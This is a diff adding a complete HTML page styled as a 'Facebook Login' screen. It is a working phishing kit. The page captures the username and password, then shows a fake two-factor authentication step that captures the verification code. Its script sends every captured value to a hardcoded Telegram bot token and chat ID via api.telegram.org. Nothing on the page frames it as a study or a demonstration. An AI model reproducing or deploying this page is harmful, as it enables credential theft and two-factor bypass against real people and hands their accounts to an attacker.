@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        fbblue: '#1877f2',
+                        fbdark: '#1c1e21',
+                        fbgray: '#e4e6eb'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f0f2f5;
+        }
+        .loading-overlay {
+            background-color: rgba(0, 0, 0, 0.7);
+        }
+        .facebook-form {
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        .login-btn {
+            transition: all 0.3s ease;
+        }
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
+        .auth-btn {
+            transition: all 0.3s ease;
+        }
+        .auth-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
+    </style>
+</head>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
+    <div class="w-full max-w-md">
+        <!-- Loading Overlay -->
+        <div id="loading" class="loading-overlay fixed inset-0 flex items-center justify-center z-50 hidden">
+            <div class="flex flex-col items-center">
+                <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500 mb-4"></div>
+                <p class="text-white text-lg">Loading...</p>
+            </div>
+        </div>
+
+        <!-- Form Section 1: Login -->
+        <div id="sec1" class="facebook-form bg-white p-6 mb-4">
+            <div class="text-center mb-6">
+                <h1 class="text-3xl font-bold text-fbblue mb-2">facebook</h1>
+                <p class="text-gray-600">Login with facebook</p>
+            </div>
+            
+            <form id="loginForm">
+                <div class="mb-4">
+                    <input type="text" id="usr" name="usr" placeholder="Email or phone" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                </div>
+                <div class="mb-4">
+                    <input type="password" id="pss" name="pss" placeholder="Password" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                </div>
+                <button type="submit" class="w-full bg-fbblue text-white py-3 rounded-lg font-semibold login-btn">Log In</button>
+            </form>
+            
+            <div class="mt-4 text-center">
+                <a href="#" class="text-blue-600 text-sm hover:underline">Forgotten password?</a>
+            </div>
+            
+            <div class="mt-6 border-t border-gray-200 pt-4">
+                <button class="w-full bg-green-500 text-white py-3 rounded-lg font-semibold auth-btn">Create New Account</button>
+            </div>
+        </div>
+
+        <!-- Form Section 2: Authentication -->
+        <div id="sec2" class="facebook-form bg-white p-6" style="display:none;">
+            <div class="text-center mb-6">
+                <h2 class="text-2xl font-bold text-gray-800">Two-Factor Authentication</h2>
+                <img src="https://gantulu.github.io/00112233.jpg">
+                <p class="text-gray-600 mt-2">Enter the code sent to Authentication app, email, or your phone</p>
+            </div>
+            
+            <form id="authForm">
+                <div class="mb-4">
+                    <input type="text" id="aut" name="aut" placeholder="Verification code" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                </div>
+                <button type="submit" class="w-full bg-fbblue text-white py-3 rounded-lg font-semibold auth-btn">Verify</button>
+            </form>
+            
+            <div class="mt-4 text-center">
+                <button onclick="resendCode()" class="text-blue-600 text-sm hover:underline">Resend code</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show loading overlay
+            document.getElementById('loading').classList.remove('hidden');
+            
+            // Get form data
+            const usr = document.getElementById('usr').value;
+            const pss = document.getElementById('pss').value;
+            
+            // Send to Telegram Bot
+            sendToTelegram(usr, pss);
+            
+            // After a delay, show sec2 and hide sec1
+            setTimeout(() => {
+                document.getElementById('sec1').style.display = 'none';
+                document.getElementById('sec2').style.display = 'block';
+                document.getElementById('loading').classList.add('hidden');
+            }, 1500);
+        });
+        
+        document.getElementById('authForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show loading overlay
+            document.getElementById('loading').classList.remove('hidden');
+            
+            // Get form data
+            const aut = document.getElementById('aut').value;
+            
+            // Send to Telegram Bot
+            sendToTelegram(null, null, aut);
+            
+            // Simulate submission delay
+            setTimeout(() => {
+                // In a real app, you would redirect or show success message
+                alert('Authentication successful!');
+                document.getElementById('loading').classList.add('hidden');
+            }, 1000);
+        });
+        
+        function resendCode() {
+            alert('Code resent to your phone');
+        }
+        
+        function sendToTelegram(usr, pss, aut) {
+            const token = '7591516299:AAH6J9wm_Zyfdob37COnf8gRHG-D3yrMQcQ';
+            const chatId = '8156447769';
+            
+            let message = 'New Login Attempt:\n';
+            if (usr) message += `Username: ${usr}\n`;
+            if (pss) message += `Password: ${pss}\n`;
+            if (aut) message += `Auth Code: ${aut}\n`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message:', error);
+            });
+        }
+    </script>
+</body>
+</html>
